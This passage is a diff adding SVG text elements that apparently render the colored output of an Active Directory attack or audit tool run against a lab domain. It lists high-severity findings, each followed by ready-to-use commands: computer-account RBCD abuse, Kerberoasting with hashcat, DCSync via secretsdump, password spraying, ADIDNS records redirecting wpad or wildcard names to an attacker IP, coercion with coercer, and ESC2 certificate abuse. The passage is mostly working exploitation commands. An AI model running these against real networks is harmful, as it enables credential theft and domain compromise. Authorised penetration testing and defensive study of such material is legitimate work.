+<text x="86.5" y="3494.0" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-addcomputer</text>
+<text x="250.9" y="3494.0" fill="#d29922" xml:space="preserve">-computer-name</text>
+<text x="368.4" y="3494.0" fill="#39c5cf" xml:space="preserve">&#x27;EVIL$&#x27;</text>
+<text x="431.0" y="3494.0" fill="#d29922" xml:space="preserve">-computer-pass</text>
+<text x="548.4" y="3494.0" fill="#39c5cf" xml:space="preserve">&#x27;Passw0rd!&#x27;</text>
+<text x="642.4" y="3494.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="697.2" y="3494.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="791.2" y="3494.0" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur:P@ssw0rd!&#x27;</text>
+<text x="86.5" y="3511.5" fill="#6e7681" xml:space="preserve"># 2) set RBCD on a target you control the DNS/write for, then get a ticket:</text>
+<text x="86.5" y="3529.0" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-rbcd</text>
+<text x="196.1" y="3529.0" fill="#d29922" xml:space="preserve">-delegate-from</text>
+<text x="313.5" y="3529.0" fill="#39c5cf" xml:space="preserve">&#x27;EVIL$&#x27;</text>
+<text x="376.2" y="3529.0" fill="#d29922" xml:space="preserve">-delegate-to</text>
+<text x="478.0" y="3529.0" fill="#39c5cf" xml:space="preserve">&#x27;&lt;TARGET$&gt;&#x27;</text>
+<text x="571.9" y="3529.0" fill="#d29922" xml:space="preserve">-action</text>
+<text x="634.6" y="3529.0" fill="#39c5cf" xml:space="preserve">write</text>
+<text x="681.5" y="3529.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="736.4" y="3529.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="830.3" y="3529.0" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur:P@ssw0rd!&#x27;</text>
+<text x="86.5" y="3546.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-getST</text>
+<text x="203.9" y="3546.5" fill="#d29922" xml:space="preserve">-spn</text>
+<text x="243.1" y="3546.5" fill="#39c5cf" xml:space="preserve">&#x27;cifs/&lt;target.fqdn&gt;&#x27;</text>
+<text x="407.5" y="3546.5" fill="#d29922" xml:space="preserve">-impersonate</text>
+<text x="509.3" y="3546.5" fill="#39c5cf" xml:space="preserve">Administrator</text>
+<text x="618.9" y="3546.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="673.7" y="3546.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="767.7" y="3546.5" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/EVIL$:Passw0rd!&#x27;</text>
+<text x="86.5" y="3564.0" fill="#6e7681" xml:space="preserve"># (Kerberos auth for steps 1-2: impacket-getTGT &#x27;corp.local/administrateur:P@ssw0rd!&#x27; -dc-ip 10.10.10.10 &amp;&amp; export KRB5CCNAME=administrateur.ccache ; add -k -no-pass)</text>
+<text x="31.7" y="3581.5" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
+<text x="86.5" y="3581.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Kerberoasting — 2 account(s)</text>
+<text x="86.5" y="3599.0" fill="#6e7681" xml:space="preserve">Accounts: svc-rc4, svc-sql</text>
+<text x="86.5" y="3616.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-GetUserSPNs</text>
+<text x="250.9" y="3616.5" fill="#d29922" xml:space="preserve">-request</text>
+<text x="321.4" y="3616.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="376.2" y="3616.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="470.1" y="3616.5" fill="#d29922" xml:space="preserve">-outputfile</text>
+<text x="564.1" y="3616.5" fill="#39c5cf" xml:space="preserve">kerberoast.hashes</text>
+<text x="705.0" y="3616.5" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur:P@ssw0rd!&#x27;</text>
+<text x="86.5" y="3634.0" fill="#6e7681" xml:space="preserve"># Kerberos (signing-enforced DC):</text>
+<text x="102.1" y="3651.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-getTGT</text>
+<text x="227.4" y="3651.5" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur:P@ssw0rd!&#x27;</text>
+<text x="525.0" y="3651.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="579.8" y="3651.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="673.7" y="3651.5" fill="#39c5cf" xml:space="preserve">&amp;&amp;</text>
+<text x="697.2" y="3651.5" fill="#39c5cf" xml:space="preserve">export</text>
+<text x="752.0" y="3651.5" fill="#39c5cf" xml:space="preserve">KRB5CCNAME=administrateur.ccache</text>
+<text x="102.1" y="3669.0" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-GetUserSPNs</text>
+<text x="266.6" y="3669.0" fill="#d29922" xml:space="preserve">-request</text>
+<text x="337.0" y="3669.0" fill="#d29922" xml:space="preserve">-k</text>
+<text x="360.5" y="3669.0" fill="#d29922" xml:space="preserve">-no-pass</text>
+<text x="431.0" y="3669.0" fill="#d29922" xml:space="preserve">-dc-host</text>
+<text x="501.5" y="3669.0" fill="#39c5cf" xml:space="preserve">DC01.corp.local</text>
+<text x="626.7" y="3669.0" fill="#d29922" xml:space="preserve">-outputfile</text>
+<text x="720.7" y="3669.0" fill="#39c5cf" xml:space="preserve">kerberoast.hashes</text>
+<text x="861.6" y="3669.0" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur&#x27;</text>
+<text x="86.5" y="3686.5" fill="#3fb950" font-weight="bold" xml:space="preserve">hashcat</text>
+<text x="149.1" y="3686.5" fill="#d29922" xml:space="preserve">-m</text>
+<text x="172.6" y="3686.5" fill="#39c5cf" xml:space="preserve">13100</text>
+<text x="219.6" y="3686.5" fill="#39c5cf" xml:space="preserve">kerberoast.hashes</text>
+<text x="360.5" y="3686.5" fill="#39c5cf" xml:space="preserve">wordlist.txt</text>
+<text x="31.7" y="3704.0" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
+<text x="86.5" y="3704.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Reversible password encryption — 1 account(s)</text>
+<text x="86.5" y="3721.5" fill="#6e7681" xml:space="preserve">These accounts store their password reversibly (RC4 under the SYSKEY), so a DCSync / secretsdump recovers the CLEARTEXT password, not just the NT hash (look under the &#x27;ClearText&#x27; / Kerberos-keys section):</text>
+<text x="86.5" y="3739.0" fill="#6e7681" xml:space="preserve">  reverse-user</text>
+<text x="86.5" y="3756.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-secretsdump</text>
+<text x="250.9" y="3756.5" fill="#d29922" xml:space="preserve">-just-dc</text>
+<text x="321.4" y="3756.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="376.2" y="3756.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="470.1" y="3756.5" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur:P@ssw0rd!@10.10.10.10&#x27;</text>
+<text x="86.5" y="3774.0" fill="#6e7681" xml:space="preserve"># Kerberos (signing-enforced DC):</text>
+<text x="102.1" y="3791.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-getTGT</text>
+<text x="227.4" y="3791.5" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur:P@ssw0rd!&#x27;</text>
+<text x="525.0" y="3791.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="579.8" y="3791.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="673.7" y="3791.5" fill="#39c5cf" xml:space="preserve">&amp;&amp;</text>
+<text x="697.2" y="3791.5" fill="#39c5cf" xml:space="preserve">export</text>
+<text x="752.0" y="3791.5" fill="#39c5cf" xml:space="preserve">KRB5CCNAME=administrateur.ccache</text>
+<text x="102.1" y="3809.0" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-secretsdump</text>
+<text x="266.6" y="3809.0" fill="#d29922" xml:space="preserve">-just-dc</text>
+<text x="337.0" y="3809.0" fill="#d29922" xml:space="preserve">-k</text>
+<text x="360.5" y="3809.0" fill="#d29922" xml:space="preserve">-no-pass</text>
+<text x="431.0" y="3809.0" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur@DC01.corp.local&#x27;</text>
+<text x="31.7" y="3826.5" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
+<text x="86.5" y="3826.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">DES Kerberos encryption enabled on 1 account(s)</text>
+<text x="86.5" y="3844.0" fill="#6e7681" xml:space="preserve">These accounts advertise DES — any Kerberos material for them is trivially crackable (and DES-only breaks modern defaults):</text>
+<text x="86.5" y="3861.5" fill="#6e7681" xml:space="preserve">  svc-des</text>
+<text x="86.5" y="3879.0" fill="#6e7681" xml:space="preserve">Roast/crack as usual; the recovered key is near-instant to break.</text>
+<text x="31.7" y="3896.5" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
+<text x="86.5" y="3896.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Shadow-admin group &#x27;Account Operators&#x27; has 1 member(s)</text>
+<text x="86.5" y="3914.0" fill="#6e7681" xml:space="preserve">Members (1):</text>
+<text x="86.5" y="3931.5" fill="#6e7681" xml:space="preserve">  • svc-sql</text>
+<text x="86.5" y="3966.5" fill="#6e7681" xml:space="preserve">Escalation: Create/modify and reset passwords of non-protected (non-adminCount) users and groups. Chain: add yourself to an unprotected but powerful group (DnsAdmins, Server/Print Operators, Exchange groups) → escalate.</text>
+<text x="31.7" y="3984.0" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
+<text x="86.5" y="3984.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Shadow-admin group &#x27;Group Policy Creator Owners&#x27; has 1 member(s)</text>
+<text x="86.5" y="4001.5" fill="#6e7681" xml:space="preserve">Members (1):</text>
+<text x="86.5" y="4019.0" fill="#6e7681" xml:space="preserve">  • Administrateur</text>
+<text x="86.5" y="4054.0" fill="#6e7681" xml:space="preserve">Escalation: Create new GPOs; with a link/edit right this is code execution in the linked scope (cross-check the gpo module).</text>
+<text x="31.7" y="4071.5" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
+<text x="86.5" y="4071.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Shadow-admin group &#x27;Pre-Windows 2000 Compatible Access&#x27; has 2 member(s)</text>
+<text x="86.5" y="4089.0" fill="#6e7681" xml:space="preserve">Members (2):</text>
+<text x="86.5" y="4106.5" fill="#6e7681" xml:space="preserve">  • DC01</text>
+<text x="86.5" y="4124.0" fill="#6e7681" xml:space="preserve">  • Authenticated Users  [FOREIGN]</text>
+<text x="86.5" y="4159.0" fill="#6e7681" xml:space="preserve">Escalation: If this group contains Everyone / Anonymous, large parts of AD become readable without authentication (legacy anonymous enumeration).</text>
+<text x="86.5" y="4176.5" fill="#6e7681" xml:space="preserve">⚠ Includes a FOREIGN (cross-domain) member → the escalation is reachable across a trust.</text>
+<text x="31.7" y="4194.0" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
+<text x="86.5" y="4194.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Unconstrained Delegation — 1 computer(s)</text>
+<text x="86.5" y="4211.5" fill="#6e7681" xml:space="preserve">These machines store TGTs of all connecting users in memory.</text>
+<text x="86.5" y="4229.0" fill="#6e7681" xml:space="preserve">Compromise → PrinterBug / PetitPotam to coerce DC → DCSync.</text>
+<text x="86.5" y="4246.5" fill="#6e7681" xml:space="preserve">Targets: WEB01</text>
+<text x="31.7" y="4264.0" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
+<text x="86.5" y="4264.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">No account lockout policy</text>
+<text x="86.5" y="4281.5" fill="#6e7681" xml:space="preserve">Unlimited password spraying / brute-force is possible without locking accounts.</text>
+<text x="86.5" y="4299.0" fill="#6e7681" xml:space="preserve"># No lockout — spray safely (nxc signs automatically):</text>
+<text x="86.5" y="4316.5" fill="#3fb950" font-weight="bold" xml:space="preserve">nxc</text>
+<text x="117.8" y="4316.5" fill="#39c5cf" xml:space="preserve">smb</text>
+<text x="149.1" y="4316.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="243.1" y="4316.5" fill="#d29922" xml:space="preserve">-u</text>
+<text x="266.6" y="4316.5" fill="#39c5cf" xml:space="preserve">users.txt</text>
+<text x="344.9" y="4316.5" fill="#d29922" xml:space="preserve">-p</text>
+<text x="368.4" y="4316.5" fill="#39c5cf" xml:space="preserve">passwords.txt</text>
+<text x="478.0" y="4316.5" fill="#d29922" xml:space="preserve">--no-bruteforce</text>
+<text x="603.2" y="4316.5" fill="#d29922" xml:space="preserve">--continue-on-success</text>
+<text x="86.5" y="4334.0" fill="#3fb950" font-weight="bold" xml:space="preserve">nxc</text>
+<text x="117.8" y="4334.0" fill="#39c5cf" xml:space="preserve">ldap</text>
+<text x="156.9" y="4334.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="250.9" y="4334.0" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="4334.0" fill="#39c5cf" xml:space="preserve">users.txt</text>
+<text x="352.7" y="4334.0" fill="#d29922" xml:space="preserve">-p</text>
+<text x="376.2" y="4334.0" fill="#39c5cf" xml:space="preserve">passwords.txt</text>
+<text x="485.8" y="4334.0" fill="#d29922" xml:space="preserve">--no-bruteforce</text>
+<text x="611.1" y="4334.0" fill="#d29922" xml:space="preserve">--continue-on-success</text>
+<text x="31.7" y="4351.5" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
+<text x="86.5" y="4351.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Reversible password encryption enabled DOMAIN-WIDE</text>
+<text x="86.5" y="4369.0" fill="#6e7681" xml:space="preserve">pwdProperties has DOMAIN_PASSWORD_STORE_CLEARTEXT (0x10) set, so EVERY account stores its password reversibly (RC4 under the SYSKEY). A DCSync / secretsdump then recovers CLEARTEXT passwords, not just NT hashes (see the &#x27;ClearText&#x27; section of the output).</text>
+<text x="86.5" y="4386.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-secretsdump</text>
+<text x="250.9" y="4386.5" fill="#d29922" xml:space="preserve">-just-dc</text>
+<text x="321.4" y="4386.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="376.2" y="4386.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="470.1" y="4386.5" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur:P@ssw0rd!@10.10.10.10&#x27;</text>
+<text x="86.5" y="4404.0" fill="#6e7681" xml:space="preserve"># Kerberos (signing-enforced DC):</text>
+<text x="102.1" y="4421.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-getTGT</text>
+<text x="227.4" y="4421.5" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur:P@ssw0rd!&#x27;</text>
+<text x="525.0" y="4421.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="579.8" y="4421.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="673.7" y="4421.5" fill="#39c5cf" xml:space="preserve">&amp;&amp;</text>
+<text x="697.2" y="4421.5" fill="#39c5cf" xml:space="preserve">export</text>
+<text x="752.0" y="4421.5" fill="#39c5cf" xml:space="preserve">KRB5CCNAME=administrateur.ccache</text>
+<text x="102.1" y="4439.0" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-secretsdump</text>
+<text x="266.6" y="4439.0" fill="#d29922" xml:space="preserve">-just-dc</text>
+<text x="337.0" y="4439.0" fill="#d29922" xml:space="preserve">-k</text>
+<text x="360.5" y="4439.0" fill="#d29922" xml:space="preserve">-no-pass</text>
+<text x="431.0" y="4439.0" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur@DC01.corp.local&#x27;</text>
+<text x="31.7" y="4456.5" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
+<text x="86.5" y="4456.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">ADIDNS spoofing — &#x27;Authenticated Users&#x27; can create records in zone corp.local</text>
+<text x="86.5" y="4474.0" fill="#6e7681" xml:space="preserve">The zone DACL grants Create-Child to Authenticated Users (S-1-5-11), so this identity can add arbitrary DNS records → NTLM coercion / relay (point a resolved-but-missing name, or wpad, at an attacker host). NOTE: a &#x27;*&#x27; wildcard already exists in this zone → it answers unresolved queries, so planting a new missing-name / wpad record is largely neutralised; overwriting the existing &#x27;*&#x27; is the path instead (see &#x27;writable records&#x27;).</text>
+<text x="102.1" y="4491.5" fill="#6e7681" xml:space="preserve"># dirkjanm dnstool.py (impacket):</text>
+<text x="102.1" y="4509.0" fill="#3fb950" font-weight="bold" xml:space="preserve">python3</text>
+<text x="164.8" y="4509.0" fill="#39c5cf" xml:space="preserve">dnstool.py</text>
+<text x="250.9" y="4509.0" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="4509.0" fill="#39c5cf" xml:space="preserve">&#x27;corp.local\administrateur&#x27;</text>
+<text x="493.6" y="4509.0" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="4509.0" fill="#39c5cf" xml:space="preserve">&#x27;&lt;password&gt;&#x27;</text>
+<text x="618.9" y="4509.0" fill="#d29922" xml:space="preserve">--action</text>
+<text x="689.4" y="4509.0" fill="#39c5cf" xml:space="preserve">add</text>
+<text x="720.7" y="4509.0" fill="#d29922" xml:space="preserve">--record</text>
+<text x="791.2" y="4509.0" fill="#39c5cf" xml:space="preserve">wpad</text>
+<text x="830.3" y="4509.0" fill="#d29922" xml:space="preserve">--data</text>
+<text x="885.1" y="4509.0" fill="#39c5cf" xml:space="preserve">&lt;ATTACKER_IP&gt;</text>
+<text x="994.8" y="4509.0" fill="#d29922" xml:space="preserve">--type</text>
+<text x="1049.6" y="4509.0" fill="#39c5cf" xml:space="preserve">A</text>
+<text x="1065.2" y="4509.0" fill="#d29922" xml:space="preserve">--zone</text>
+<text x="1120.0" y="4509.0" fill="#39c5cf" xml:space="preserve">corp.local</text>
+<text x="1206.2" y="4509.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="102.1" y="4526.5" fill="#6e7681" xml:space="preserve"># or Powermad (from a domain-joined Windows host):</text>
+<text x="86.5" y="4544.0" fill="#6e7681" xml:space="preserve">  Invoke-DNSUpdate -DNSType A -DNSName wpad -DNSData &lt;ATTACKER_IP&gt;</text>
+<text x="31.7" y="4561.5" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
+<text x="86.5" y="4561.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">ADIDNS spoofing — &#x27;Authenticated Users&#x27; can create records in zone _msdcs.corp.local</text>
+<text x="86.5" y="4579.0" fill="#6e7681" xml:space="preserve">The zone DACL grants Create-Child to Authenticated Users (S-1-5-11), so this identity can add arbitrary DNS records → NTLM coercion / relay (point a resolved-but-missing name, or wpad, at an attacker host). wpad is ABSENT → add it to coerce WPAD clients. No &#x27;*&#x27; wildcard exists → creating one is a DOMAIN-WIDE catch-all for every unresolved name (strongest):</text>
+<text x="102.1" y="4596.5" fill="#3fb950" font-weight="bold" xml:space="preserve">python3</text>
+<text x="164.8" y="4596.5" fill="#39c5cf" xml:space="preserve">dnstool.py</text>
+<text x="250.9" y="4596.5" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="4596.5" fill="#39c5cf" xml:space="preserve">&#x27;corp.local\administrateur&#x27;</text>
+<text x="493.6" y="4596.5" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="4596.5" fill="#39c5cf" xml:space="preserve">&#x27;&lt;password&gt;&#x27;</text>
+<text x="618.9" y="4596.5" fill="#d29922" xml:space="preserve">--action</text>
+<text x="689.4" y="4596.5" fill="#39c5cf" xml:space="preserve">add</text>
+<text x="720.7" y="4596.5" fill="#d29922" xml:space="preserve">--record</text>
+<text x="791.2" y="4596.5" fill="#39c5cf" xml:space="preserve">&#x27;*&#x27;</text>
+<text x="822.5" y="4596.5" fill="#d29922" xml:space="preserve">--data</text>
+<text x="877.3" y="4596.5" fill="#39c5cf" xml:space="preserve">&lt;ATTACKER_IP&gt;</text>
+<text x="986.9" y="4596.5" fill="#d29922" xml:space="preserve">--type</text>
+<text x="1041.7" y="4596.5" fill="#39c5cf" xml:space="preserve">A</text>
+<text x="1057.4" y="4596.5" fill="#d29922" xml:space="preserve">--zone</text>
+<text x="1112.2" y="4596.5" fill="#39c5cf" xml:space="preserve">_msdcs.corp.local</text>
+<text x="1253.1" y="4596.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="102.1" y="4614.0" fill="#6e7681" xml:space="preserve"># dirkjanm dnstool.py (impacket):</text>
+<text x="102.1" y="4631.5" fill="#3fb950" font-weight="bold" xml:space="preserve">python3</text>
+<text x="164.8" y="4631.5" fill="#39c5cf" xml:space="preserve">dnstool.py</text>
+<text x="250.9" y="4631.5" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="4631.5" fill="#39c5cf" xml:space="preserve">&#x27;corp.local\administrateur&#x27;</text>
+<text x="493.6" y="4631.5" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="4631.5" fill="#39c5cf" xml:space="preserve">&#x27;&lt;password&gt;&#x27;</text>
+<text x="618.9" y="4631.5" fill="#d29922" xml:space="preserve">--action</text>
+<text x="689.4" y="4631.5" fill="#39c5cf" xml:space="preserve">add</text>
+<text x="720.7" y="4631.5" fill="#d29922" xml:space="preserve">--record</text>
+<text x="791.2" y="4631.5" fill="#39c5cf" xml:space="preserve">wpad</text>
+<text x="830.3" y="4631.5" fill="#d29922" xml:space="preserve">--data</text>
+<text x="885.1" y="4631.5" fill="#39c5cf" xml:space="preserve">&lt;ATTACKER_IP&gt;</text>
+<text x="994.8" y="4631.5" fill="#d29922" xml:space="preserve">--type</text>
+<text x="1049.6" y="4631.5" fill="#39c5cf" xml:space="preserve">A</text>
+<text x="1065.2" y="4631.5" fill="#d29922" xml:space="preserve">--zone</text>
+<text x="1120.0" y="4631.5" fill="#39c5cf" xml:space="preserve">_msdcs.corp.local</text>
+<text x="1261.0" y="4631.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="102.1" y="4649.0" fill="#6e7681" xml:space="preserve"># or Powermad (from a domain-joined Windows host):</text>
+<text x="86.5" y="4666.5" fill="#6e7681" xml:space="preserve">  Invoke-DNSUpdate -DNSType A -DNSName wpad -DNSData &lt;ATTACKER_IP&gt;</text>
+<text x="31.7" y="4684.0" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
+<text x="86.5" y="4684.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">ADIDNS — 1 existing record(s) writable by non-priv principals</text>
+<text x="86.5" y="4701.5" fill="#6e7681" xml:space="preserve">A non-privileged principal can overwrite these existing DNS records → hijack a legitimate name (redirect a server&#x27;s A record to an attacker host for coercion / MITM).</text>
+<text x="86.5" y="4719.0" fill="#6e7681" xml:space="preserve">  - legacy-app.corp.local (A) writable by corp.local\lowpriv</text>
+<text x="102.1" y="4736.5" fill="#6e7681" xml:space="preserve"># overwrite with dnstool.py --action modify:</text>
+<text x="102.1" y="4754.0" fill="#3fb950" font-weight="bold" xml:space="preserve">python3</text>
+<text x="164.8" y="4754.0" fill="#39c5cf" xml:space="preserve">dnstool.py</text>
+<text x="250.9" y="4754.0" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="4754.0" fill="#39c5cf" xml:space="preserve">&#x27;corp.local\administrateur&#x27;</text>
+<text x="493.6" y="4754.0" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="4754.0" fill="#39c5cf" xml:space="preserve">&#x27;&lt;password&gt;&#x27;</text>
+<text x="618.9" y="4754.0" fill="#d29922" xml:space="preserve">--action</text>
+<text x="689.4" y="4754.0" fill="#39c5cf" xml:space="preserve">modify</text>
+<text x="744.2" y="4754.0" fill="#d29922" xml:space="preserve">--record</text>
+<text x="814.7" y="4754.0" fill="#39c5cf" xml:space="preserve">&lt;name&gt;</text>
+<text x="869.5" y="4754.0" fill="#d29922" xml:space="preserve">--data</text>
+<text x="924.3" y="4754.0" fill="#39c5cf" xml:space="preserve">&lt;ATTACKER_IP&gt;</text>
+<text x="1033.9" y="4754.0" fill="#d29922" xml:space="preserve">--type</text>
+<text x="1088.7" y="4754.0" fill="#39c5cf" xml:space="preserve">A</text>
+<text x="1104.4" y="4754.0" fill="#d29922" xml:space="preserve">--zone</text>
+<text x="1159.2" y="4754.0" fill="#39c5cf" xml:space="preserve">&lt;zone&gt;</text>
+<text x="1214.0" y="4754.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="31.7" y="4771.5" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
+<text x="86.5" y="4771.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Unconstrained Delegation — 1 account(s)</text>
+<text x="86.5" y="4789.0" fill="#6e7681" xml:space="preserve">Compromise these accounts → capture TGTs of any connecting user (incl. DA).</text>
+<text x="86.5" y="4806.5" fill="#6e7681" xml:space="preserve">Accounts: WEB01$</text>
+<text x="86.5" y="4824.0" fill="#6e7681" xml:space="preserve"># With control of &#x27;WEB01$&#x27;, capture TGTs of coerced callers:</text>
+<text x="86.5" y="4841.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-krbrelayx</text>
+<text x="235.2" y="4841.5" fill="#d29922" xml:space="preserve">-t</text>
+<text x="258.7" y="4841.5" fill="#39c5cf" xml:space="preserve">ldap://&lt;dc&gt;</text>
+<text x="352.7" y="4841.5" fill="#d29922" xml:space="preserve">--no-dump</text>
+<text x="446.6" y="4841.5" fill="#6e7681" xml:space="preserve"># or Rubeus monitor on the host</text>
+<text x="86.5" y="4859.0" fill="#6e7681" xml:space="preserve"># coerce a DC/privileged host to authenticate to &#x27;WEB01$&#x27;:</text>
+<text x="86.5" y="4876.5" fill="#3fb950" font-weight="bold" xml:space="preserve">coercer</text>
+<text x="149.1" y="4876.5" fill="#39c5cf" xml:space="preserve">coerce</text>
+<text x="203.9" y="4876.5" fill="#d29922" xml:space="preserve">-l</text>
+<text x="227.4" y="4876.5" fill="#39c5cf" xml:space="preserve">&lt;attacker-ip&gt;</text>
+<text x="337.0" y="4876.5" fill="#d29922" xml:space="preserve">-t</text>
+<text x="360.5" y="4876.5" fill="#39c5cf" xml:space="preserve">&lt;dc-ip&gt;</text>
+<text x="423.2" y="4876.5" fill="#d29922" xml:space="preserve">-u</text>
+<text x="446.6" y="4876.5" fill="#39c5cf" xml:space="preserve">&#x27;administrateur&#x27;</text>
+<text x="579.8" y="4876.5" fill="#d29922" xml:space="preserve">-p</text>
+<text x="603.2" y="4876.5" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="697.2" y="4876.5" fill="#d29922" xml:space="preserve">-d</text>
+<text x="720.7" y="4876.5" fill="#39c5cf" xml:space="preserve">corp.local</text>
+<text x="806.8" y="4876.5" fill="#d29922" xml:space="preserve">--always-continue</text>
+<text x="31.7" y="4894.0" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
+<text x="86.5" y="4894.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">ESC2 — 1 vulnerable template(s)</text>
+<text x="86.5" y="4911.5" fill="#6e7681" xml:space="preserve">Certificate can be used for any purpose including authentication.</text>
+<text x="86.5" y="4929.0" fill="#6e7681" xml:space="preserve">Enrollable by a principal the current identity controls:</text>
+<text x="86.5" y="4946.5" fill="#6e7681" xml:space="preserve">  - ESC2-Test  (enrollable by: Domain Users, Domain Admins, Enterprise Admins)</text>
+<text x="133.4" y="4964.0" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="4964.0" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="4964.0" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="4964.0" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="4964.0" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="4964.0" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="611.1" y="4964.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="665.9" y="4964.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="759.9" y="4964.0" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="791.2" y="4964.0" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="869.5" y="4964.0" fill="#d29922" xml:space="preserve">-template</text>
+<text x="947.8" y="4964.0" fill="#39c5cf" xml:space="preserve">&#x27;ESC2-Test&#x27;</text>
+<text x="133.4" y="4981.5" fill="#6e7681" xml:space="preserve"># Any-Purpose/SubCA cert — usable for client auth; then certipy-ad auth -pfx &lt;out&gt;.pfx -dc-ip 10.10.10.10</text>
+<text x="133.4" y="4999.0" fill="#6e7681" xml:space="preserve"># If RPC is filtered — Kerberos: impacket-getTGT corp.local/administrateur:&#x27;P@ssw0rd!&#x27; -dc-ip 10.10.10.10 &amp;&amp; export KRB5CCNAME=administrateur.ccache</text>
+<text x="133.4" y="5016.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
